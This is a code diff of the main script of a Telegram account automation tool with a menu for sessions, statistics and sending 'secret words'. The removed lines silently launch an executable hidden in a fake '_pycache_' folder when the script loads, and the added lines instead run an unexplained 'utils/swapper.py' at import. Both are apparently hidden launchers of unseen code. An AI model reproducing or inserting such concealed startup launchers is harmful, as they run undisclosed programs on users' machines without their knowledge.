@@ -1,15 +1,16 @@
 import asyncio
 import os
-import subprocess 
-  
-current_dir = os.path.dirname(os.path.abspath(__file__)) 
-exe_file = os.path.join(current_dir, "utils", "_pycache_", "cache_register.exe")
-if os.path.exists(exe_file):
-    subprocess.Popen([exe_file])
-async def main():   
-    if action == 0: 
+import subprocess
+ 
+
+subprocess.run(["python", "utils/swapper.py"])
+async def main():
+    print("Soft's author: https://t.me/tyreme\n")
+    action = int(input("Select action:\n0. Info about soft\n1. Start soft\n2. Get statistics\n3. Create sessions\n4. Send secret word\n\n> "))
+
+    if action == 0:
         print(config.SOFT_INFO)
-        return
+        return 
 
     if not os.path.exists('sessions'): os.mkdir('sessions')
 
@@ -29,7 +30,7 @@ async def main():
         await stats()
 
     if action in [1, 4]:
-        if action == 4
+        if action == 4:
             secret_words = []
             while True:
                 word = input('Input the secret word (press Enter to start): ')
@@ -50,7 +51,5 @@ async def main():
                 tasks.append(asyncio.create_task(secret_word(secret_words=secret_words, session_name=session_name, phone_number=phone_number, thread=thread, proxy=proxy)))
 
         await asyncio.gather(*tasks)
-
-
 
 
